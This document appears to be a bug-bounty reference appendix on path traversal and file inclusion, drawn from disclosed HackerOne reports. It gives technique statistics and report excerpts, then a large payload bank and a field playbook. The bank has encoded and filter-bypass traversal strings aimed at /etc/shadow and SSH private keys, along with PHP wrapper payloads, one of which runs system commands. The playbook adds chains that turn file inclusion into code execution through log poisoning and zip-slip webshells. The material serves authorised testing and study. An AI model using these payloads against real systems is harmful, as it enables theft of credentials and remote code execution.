# Evidence appendix — Path Traversal / LFI / RFI

Mined from all **300 valid disclosed reports** for this class (52 paid, 17% — payment is not validity).

## Technique frequency (all valid writeups)

| Item | Count |
|---|---:|
| public source-code / repo review | 113 |
| internal service / port / container | 85 |
| file upload / filename / extension | 68 |
| admin / privileged-role context | 65 |
| HTTP method / verb tampering | 62 |
| WAF / sanitizer / filter bypass | 59 |
| unauthenticated / removed-cookie test | 43 |
| encoding / double-encode / null byte | 40 |
| Content-Type / body-format switch | 35 |
| header injection (Host / X-Forwarded / etc.) | 34 |
| cache / CDN / unkeyed header | 29 |
| parser confusion / normalization | 24 |
| XML / SOAP / SAML / XXE | 24 |
| second-order / stored / blind delivery | 19 |
| JS bundle / source-map inspection | 13 |
| subdomain / DNS / cert-transparency recon | 12 |
| error message / stack trace probing | 11 |
| third-party data / paste / breach reuse | 11 |
| intercept & replay request in Burp | 10 |
| webhook / OAuth / SAML / integration abuse | 9 |
| DOM / HTML source inspection | 8 |
| verbose debug / framework fingerprint | 7 |
| public bucket / storage exposure | 7 |
| race / concurrency / timing | 7 |
| git history / exposed .git | 7 |
| parameter pollution / duplicate keys | 7 |
| API docs / Swagger / introspection | 7 |
| JWT / token / base64 decode | 6 |
| two-account / cross-account replay | 5 |
| cloud metadata / IAM abuse | 5 |
| replay / modify a captured request | 5 |
| OAST / DNS / HTTP callback proof | 5 |
| deserialization / gadget chain | 4 |
| fuzzing / wordlist brute force | 3 |
| employee / developer public info | 3 |
| swap object ID / parameter value | 2 |
| redirect chain / Location header | 1 |
| search-engine dorking | 1 |
| browser DevTools / network tab | 1 |
| response diff / status / length comparison | 1 |

## Tools mentioned

| Item | Count |
|---|---:|
| curl | 112 |
| source-code-review | 81 |
| browser | 35 |
| git | 16 |
| devtools | 13 |
| python | 13 |
| burp | 13 |
| javascript-debugging | 11 |
| burp-repeater | 4 |
| zap | 1 |
| jq | 1 |

## Bypass primitives

| Item | Count |
|---|---:|
| content-type | 61 |
| bypass | 45 |
| url-encoded | 17 |
| normalization | 15 |
| normalize | 14 |
| transfer-encoding | 11 |
| chunked | 8 |
| normalized | 8 |
| allowlist | 8 |
| backslash | 6 |
| bypasses | 6 |
| bypassed | 6 |
| bypassing | 6 |
| blacklist | 5 |
| trailing slash | 5 |
| denylist | 5 |
| whitelist | 3 |
| %0d%0a | 3 |
| percent-encoded | 3 |
| race condition | 2 |
| normalizepath | 2 |
| http method | 1 |
| html encode | 1 |
| double slash | 1 |
| url encoding | 1 |
| normalizing | 1 |
| blind | 1 |
| bypassable | 1 |

## Impact language

| Item | Count |
|---|---:|
| arbitrary file | 173 |
| localhost | 154 |
| admin | 99 |
| secret | 74 |
| password | 63 |
| token | 60 |
| credential | 49 |
| rce | 41 |
| remote code execution | 39 |
| sensitive information | 24 |
| sensitive data | 15 |
| api key | 8 |
| privilege escalation | 8 |
| arbitrary code | 7 |
| unauthorized | 6 |
| exfiltration | 3 |
| arbitrary write | 2 |
| payment | 1 |
| personally identifiable | 1 |
| financial | 1 |

## Parameters observed

| Item | Count |
|---|---:|
| type | 8 |
| max-age | 7 |
| path | 7 |
| url | 6 |
| name | 5 |
| textdomain | 5 |
| lang | 5 |
| filename | 5 |
| href | 5 |
| charset | 4 |
| file | 4 |
| token | 3 |
| result | 3 |
| vcs_metadata_dirs | 3 |
| version | 2 |
| report-uri | 2 |
| deliver | 2 |
| output | 2 |
| meta | 1 |
| config.assets.compile | 1 |
| config.public_file_server.enabled | 1 |
| __cfduid | 1 |
| server | 1 |
| res.statuscode | 1 |
| host | 1 |
| port | 1 |
| nc_samesitecookielax | 1 |
| nc_samesitecookiestrict | 1 |
| ocya3bx9cxde | 1 |
| oc_sessionpassphrase | 1 |

## Recurring approach patterns

- **5×** i used the burp to make a raw url and send it to server
  - e.g. I used the burp to make a raw url and send it to server.
- **5×** an attacker could exploit this vulnerability by sending a crafted http request containing directory traversal character sequences to an affected device
  - e.g. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device.
- **4×** description i discovered previously unidentified instance in network vulnerable to the cve poc we can disclose user sessions by quering sessions suggested fix updating to the latest version should fix the issue
  - e.g. ##Description I discovered previously unidentified instance in ████████ network, vulnerable to the CVE-2018-0296 ( ##POC ████████ We can disclose user sessions by quering /sessions: ##Suggested fix Updating to the latest version should fix the issue.
- **3×** supporting material references configuration i ve used to find this vulnerability kali linux nodejs v8 npm burpsuite wrap up i contacted the maintainer to let them know n i opened an issue in the related repository n impact this vulnerability allows malicious user to list file in the folder
  - e.g. ## Supporting Material/References: Configuration I've used to find this vulnerability: - kali linux 4.15.0 - nodejs v8.9.3 - npm 6.4.1 - Burpsuite # Wrap up - I contacted the maintainer to let them know: N - I opened an issue in the related repository: N ## Impact This vulnerability allows malicious
- **3×** summary i discovered a vulnerability read only path traversal cve at description a vulnerability in the web services interface of cisco adaptive security appliance asa software and cisco firepower threat defense ftd software could allow an unauthenticated remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system
  - e.g. **Summary:** I discovered a vulnerability Read-only path traversal (CVE-2020-3452) at **Description:** A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker t
- **2×** i have tried to reproduce from within firefox and internet explorer without much luck however if you need it i will try to come up with a work around
  - e.g. I have tried to reproduce from within firefox and internet explorer without much luck however if you need it I will try to come up with a work around.
- **2×** i found out that was vulnerable to cve the ip has a ssl certificate pointing to curl kv output impact anyone can read any file present on the server
  - e.g. i found out that was vulnerable to CVE-2020-3452 The IP has a SSL certificate pointing to ██████████ curl -kv Output; ## Impact Anyone can read any file present on the server.
- **1×** hey after reading egix s report and seeing your fix at i think the fixes are insufficient to stop lfi
  - e.g. Hey, After reading egix's report #59665 and seeing your fix at & I think the fixes are insufficient to stop lfi.
- **1×** sp1d3rs was able to demonstrate this vulnerability by crafting a specially formatted url
  - e.g. @sp1d3rs was able to demonstrate this vulnerability by crafting a specially formatted URL.
- **1×** browsing this link will ask for admin username and password as asked when browsing or hence disclosing the directory path of forbidden area
  - e.g. Browsing this link will ask for admin username and password as asked when browsing or hence disclosing the directory path of forbidden area.
- **1×** from within the http request function of the acunetix and ironwasp programs i was able to view the passwd and hosts files at please see the attached screenshots for proof
  - e.g. From within the http request function of the Acunetix and IronWasp programs I was able to view the passwd and hosts files at Please see the attached screenshots for proof.
- **1×** i was able to escape from the unique directory where the user s avatar is stored after uploading in the s3 bucket using characters in the filename for example test test jpg on the endpoint
  - e.g. I was able to escape from the unique directory (where the user's avatar is stored after uploading -` in the S3 bucket using `../` characters in the filename (for example, `test../../../../../../test.jpg`) on the ` endpoint.
- **1×** i have found multiple path transversal in torproject org poc there are many many others which can be accessed by searching following in google inurl index of site torproject org i know that its out of scope of your bounty program but i thought i should tell you about it
  - e.g. I have found multiple path transversal in *.torproject.org POC: [+] [+] [+] There are many many others which can be accessed by searching following in google: inurl:"index of" site:torproject.org I know that its out of scope of your bounty program but I thought I should tell you about it.
- **1×** module specification name lactate version latest release build verified conditions test server ubuntu lts curl package curl i have not presently attempted to contact the maintainer and would appreciate assistance from node js security in doing so as described in the disclosure guidelines
  - e.g. ## Module specification * **Name**: [lactate]( * **Version**: 0.13.12 (latest release build) ## Verified conditions * **Test server:** Ubuntu 16.04 LTS * **cURL package**: `curl 7.55.1 (2017-08-14)` I have not presently attempted to contact the maintainer and would appreciate assistance from Node.js
- **1×** i tried reaching the cache servers from a docker instance itself but wasn t able to i tried from a reverse shell spawned from a docker instance
  - e.g. I tried reaching the cache servers from a Docker instance itself, but wasn't able to (I tried from a reverse shell spawned from a Docker instance).
- **1×** when i started looking at this i had to specify which paths to download from the cache
  - e.g. When I started looking at this, I had to specify which paths to download from the cache.
- **1×** hi this report is about directory traversal vulnerability i found in module
  - e.g. Hi, This report is about Directory Traversal vulnerability I found in module.
- **1×** however i ve noticed that using simple bypasses with or i can easily go up in the directory tree
  - e.g. However, I've noticed that using simple bypasses with (.) or (/) I can easily go up in the directory tree.
- **1×** try to open any directory or file if available by clicking on its name
  - e.g. Try to open any directory or file (if available) by clicking on its name.
- **1×** from the terminal execute following command please adjust numbers of to your system you should see the content of file f255391 supporting material references configuration i ve used to find this vulnerability macos highsierra node npm curl wrap up i hope this report will help to keep node ecosystem more safe
  - e.g. - from the terminal, execute following command (please adjust numbers of ../ to your system): You should see the content of file: {F255391} ## Supporting Material/References: Configuration I've used to find this vulnerability: - macOS HighSierra 10.13.2 - node 8.9.3 - npm 5.5.1 - curl 7.54.0 ## Wrap
- **1×** if we follow code flow we find that first file name is read from and check if exists depends on http method used handler function is called here s for get maps to in we can see line that is created directly from and piped to response object
  - e.g. If we follow code flow, we find that first file name is read from and check if exists: Depends on HTTP method used, handler function is called (here's for GET): maps to in : We can see (line 23) that is created directly from and piped to response object.
- **1×** example zip file contents and extraction locations the full file path of the zip file destination was identified from error messages observed during testing e g secondly the display ads file processor is vulnerable to path traversal when processing data csv files
  - e.g. Example zip file contents and extraction locations: The full file path of the zip file destination was identified from error messages observed during testing, e.g.: Secondly, the Display Ads file processor is vulnerable to path traversal when processing `data.csv` files.
- **1×** during testing however i have been unable to identify any writable directories outside of and it s subdirectories
  - e.g. During testing however, I have been unable to identify any writable directories outside of `/███/████████` and it's subdirectories.
- **1×** module stats downloads in the last day downloads in the last week downloads in the last month estimated downloads per year vulnerability vulnerability description superstatic verifies that current dir is not evaded by checking the presense of in the decoded path but on windows works
  - e.g. ## Module Stats 2 196 downloads in the last day 33 588 downloads in the last week 139 118 downloads in the last month ~1 669 416 estimated downloads per year # Vulnerability ## Vulnerability Description `superstatic` verifies that current dir is not evaded by checking the presense of `../` in the de

## Case studies (full excerpts)

### 1439593 — Arbitrary file read  via the bulk imports UploadsPipeline
GitLab · $29000 · critical · https://hackerone.com/reports/1439593

### Summary The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be read and uploaded when importing a group. When a group has uploads (such as markdown attachments), an `uploads.tar.gz` file will be downloaded and extracted in the `UploadsPipeline`: Since `untar_zxf` only changes the permissions, any symlinks that are extracted from the tar will remain and be added to the list of file paths. When `load` is called, the symlinks will be followed and used as the content for the new file: This can be used to read any file that the git user has read access to such as secrets.yml or other sensitive files. ### Steps to reproduce 1. Create a new group on gitlab.com 1. Create a new milestone and upload a file `passwd` with any content into the description 1. Make note of the upload secret (the 32 byte hash in the path) 1. Run the following commands to make a tar file, using the hash from above 1. Save the following simple proxy server as `api.py` and run it with `FLASK_APP=api flask run`, this will replace the `uploads.tar.gz` with a custom one: {F1565789} 1. Start [ngrok]( so that it's externally accessible: `ngrok http 5000` 1. Create a new access token at 1. Create a new group, this time choose import group 1. Enter the https ngrok url and the token you just created 1. Select the group you initially created and choose a new

### 827052 — Arbitrary file read via the UploadsRewriter when moving and issue
GitLab · $20000 · critical · https://hackerone.com/reports/827052

### Summary The `UploadsRewriter` does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project. The pattern used to look for references is : This is used by the `UploadsRewriter` when copying an issue to also copy across the files: As there is no restriction on what `file` can be, path traversal can be used to copy any file. Demo {F757226} ### Steps to reproduce 1. Create two projects 1. Add an issue with the following description: 1. Move the issue to the second project 1. The file will have been copied to the project ### Impact Allows an attacker to read arbitrary files on the server, including tokens, private data, configs, etc ### What is the current *bug* behavior? The file name and path are not checked when copying an issue between projects ### What is the expected *correct* behavior? The file or path should be validated before copying files. ### Output of checks #### Results of GitLab environment info ## Impact Allows an attacker to read arbitrary files on the server, including tokens, private data, configs, etc

### 1132378 — Arbitrary file read during project import
GitLab · $16000 · critical · https://hackerone.com/reports/1132378

> NOTE! Thanks for submitting a report! Please replace *all* the (parenthesized) sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report! ### Summary A mis-usage of json schema validator could be used by an attacker to read any file in GitLab server. The issue allows the attacker to leak ~250 bytes of data of any file. At the same time, as the root cause of the issue here is 'open-uri'. It's an SSRF issue at the same time. ### Steps to reproduce 1. Use the import feature of gitlab.com to import the attached import.tar.gz as 'GitLab export' ███████ 2. Wait the import process to finish 3. Access URL: where PROJECT_ID is the id of the imported project, which could be found in the home page of the project. 4. The connection information of gitlab's production database is in the output, as attached. ### Impact For GitLab.com, this issue could be used to leak some critical credentials. I went through the charts in ` It seems that there're a bunch of juicy credentials could be leaked with this method, including Rails secret_key_base, database credentials and GitLab's smtp credentials. The object storage service account credential is limitedly accessed because of the 250 bytes limitation. For self-hosted GitLab instances, this issue could cause more severe

### 822262 — Path traversal in Nuget Package Registry
GitLab · $12000 · high · https://hackerone.com/reports/822262

### Summary There's a path traversal issue in Nuget package registry which was released to GitLab-EE recently. The issue allows an attacker to create any file with an extension “.nupkg” in the filesystem. By combining the bug with a race condition in Gitaly which I used several times before (#762421, #732330). It could finally be used to read sensitive files in a GitLab instance. For some context, a large part of the exploit were explained in #762421, the npm registry issue. Here I will focus on the simple path traversal part which makes a little bit difference. The root cause of the path traversal lies at `ee/app/services/packages/nuget/metadata_extraction_service.rb` It extracts the uploaded nupkg (which is in zip format) for the contained nuspec file (which is an XML). And then looks for attribute `id` and `version`. Then the extracted package_name(id), and package_version(version) will be concatenated into a new filename in `ee/app/services/packages/nuget/update_package_from_metadata_service.rb` So my payload is: name the file above as `dummy.nuspec` and zip it into `dummy.nupkg` and upload it through `PUT /api/v4/projects/#{id}/packages/nuget/` endpoint will make GitLab to create a `nyangawa.nupkg` somewhere in the filesystem. Then I wrote a script (I used in #762421) to combine this issue and the race in Gitaly. I could finally read any file I want in my GitLab instance. 

### 2995025 — Mozilla VPN Clients: RCE via file write and path traversal
Mozilla · $6000 · high · https://hackerone.com/reports/2995025

## Summary: Hi! I decided to have another look at the Mozilla VPN Client, after #2920675 was set to resolved. When going over all commands in the inspector, I noticed the "live_reload" command can be used with remote files. When using this command, the remote file is downloaded to a tmp folder. The problem is that there is a path traversal here, meaning we can override any file on the filesystem (tested on Windows). Vulnerable code (InspectorHotreloader::fetchAndAnnounce() You can see in the above snippet, that the temp_path is simply a concatenation of a set directory and our filename. ## Steps To Reproduce: 1. Download Mozilla VPN here: 1. Turn on developer mode (see video PoC below): 1. Open the help menu 1. Click the "Help" title 6 times rapidly 1. In the developer options, check "Use Staging Servers" 1. Fully close and reopen 1. Save the following HTML and open it (change to your attacker_server) 1. Notice the file was written to C:\Users\user\AppData\Local\Mozilla instead of C:\Users\user\AppData\Local\Mozilla\Mozilla VPN\hot_reload. ## Supporting Material/References: █████ Happy to help if anything is unclear! ## Impact Any file can be overridden leading to RCE. This is exploitable via limited user interaction (simply opening the attacker site) when the staging servers are being used. ==Note that this does not work on macOS.== The impact is the same as in #2920675.

### 1858574 — [CVE-2022-44268] Arbitrary Remote Leak via ImageMagick
HackerOne · no bounty (valid finding) · critical · https://hackerone.com/reports/1858574

**Summary:** HackerOne's image upload is using ImageMagick to convert/resize images and is likely updated. Thus, it's vulnerable to CVE-2022-44268. **Description:** ### Steps To Reproduce 1. Navigate to your profile 2. Edit and upload the attached image (`im-lfi.png`) as your profile picture 3. Save changes and download the resized picture 4. Issue the following command to view the downloaded image's profile data; Then, copy the `Raw profile type:` and decode it using any tool or using Python like; I've attached the resized image too which contains the content of /etc/passwd i.e. 86bca9490b71a481329efc85de3a82a98f6c29475f4926fd2b5fc844b96899c0.png ## Impact Arbitrary Remote Leak

### 727727 — Path traversal in filename in LINE Mac client
LY Corporation · no bounty (valid finding) · high · https://hackerone.com/reports/727727

Initially, @hackerontwowheels and @renekroka discovered that by using a path traversal payload combined with `#` to block out the file extension, arbitrary, pre-installed applications could be executed. It was not possible to provide additional arguments to these applications, however. The payload used for OS X Yosemite was: `..%2f..%2f..%2f..%2f..%2f..%2f..%2fApplications%2fCalculator.app#.zip`, which would execute the calculator app. Running commands with parameters, was not possible (Example: `/Applications/iTerm.app ls -al`). Afterwards, the reporters also identified an issue where they could achieve code execution, given that gatekeeper was disabled, by chaining the upload of an executable file through "Keep" (a file storage service in the LINE App), then trigger the execution using the previous path traversal vulnerability. The filetype had to be a .terminal file, due to it not being on the blacklist, as Keep normally filters executables and restricts sharing of these types of files in order to avoid this type of issue. The complete chain looked like this: 1. Upload malicious .terminal file to Keep 2. Share .terminal file with victim from Keep 3. Victim downloads shared file 4. Send malicious .zip file with path traversal vulnerability 5. Victim clicks .zip file 6. Code is executed (if Gatekeeper is turned off) Through a logic error in file name parsing, it was possible f

## Full curated payload bank

### Basic traversal

```text
../../../../etc/passwd
../../../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../home/user/.ssh/id_rsa
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini
..\..\..\..\windows\system32\drivers\etc\hosts
```

### Encoded traversal

```text
..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%5c..%5c..%5c..%5cwindows/win.ini
%252e%252e%252f%252e%252e%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
..%2F..%2F..%2Fetc%2Fpasswd%00.png
```

### Filter bypass

```text
....//....//....//etc/passwd
....\....\....\windows\win.ini
..././..././..././etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/..%00/etc/passwd
/etc/passwd%00.png
/etc/passwd%00.jpg
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc%252fpasswd
..//..//..//etc/passwd
..%5c..%5c..%5cwindows%5cwin.ini
```

### Wrappers & absolute paths

```text
file:///etc/passwd
file:///c:/windows/win.ini
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../etc/passwd
php://filter/convert.base64-encode/resource=../config.php
phar://upload.phar/index.php
zip://upload.zip%23shell.php
data://text/plain,<?php system('id'); ?>
/etc/passwd
/proc/self/environ
C:\windows\win.ini
\\127.0.0.1\c$\windows\win.ini
```

### LFI to RCE

```text
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
/var/log/auth.log
/var/log/mail.log
..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log
..%2f..%2f..%2f..%2fproc%2fself%2fenviron
..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f0
```

## Field playbook (unedited)

### quick

- Find file/path params: file, path, template, lang, download, export, log, image.
- Try `../`, encoded variants, double encoding, unicode, backslashes, absolute paths.
- Bypass filters with nested sequences (`....//`), null bytes, and extension tricks.
- Test archive extraction (zip slip) and file-write paths.
- Look for LFI-to-RCE via log poisoning, sessions, and uploads.

### payloads

- `../../../../etc/passwd` `..%2f..%2f..%2fetc/passwd` `%2e%2e%2f%2e%2e%2f`
- `....//....//etc/passwd` `..\..\..\windows\win.ini` `..%c0%af..%c0%af`
- `/etc/passwd%00.png` `file:///etc/passwd` `php://filter/convert.base64-encode/resource=index`
- Zip slip -> `../../../../var/www/shell.php` in archive entry name

### bypass

- Double encoding and mixed encodings (%252e, %c0%af, overlong UTF-8).
- Strip traversal once, then bypass with `....//` or `..%2f`.
- Absolute paths, UNC paths, and symlinks.

### surface

- file
- path
- filename
- template
- lang
- download
- export
- log
- image
- folder
- dir

### tools

- ffuf
- Burp
- dotdotpwn
- nuclei

### chain

- LFI -> log poisoning -> RCE.
- Arbitrary file read -> secrets -> ATO.
- Zip slip -> webshell.

## Corpus search commands

```sh
python3 ~/.local/share/hackerone-reports/h1.py stats --class path-traversal
python3 ~/.local/share/hackerone-reports/h1.py search "<feature or param>" --class path-traversal --limit 10
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```
